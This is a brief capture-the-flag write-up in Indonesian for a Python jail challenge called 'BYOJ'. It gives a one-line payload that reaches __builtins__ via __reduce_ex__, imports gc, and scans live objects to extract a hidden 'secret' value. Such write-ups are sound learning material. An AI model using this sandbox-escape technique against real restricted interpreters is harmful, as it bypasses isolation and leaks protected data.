# BYOJ Writeup

Manfaatin modul `gc` buat force collect semua object, termasuk diantaranya modul `__main__`.

```python
[(s)for(s)in[].__reduce_ex__(7)[0].__builtins__['__import__']('gc').get_objects()if'secr'in(f'{s}')][7]['secret']
```
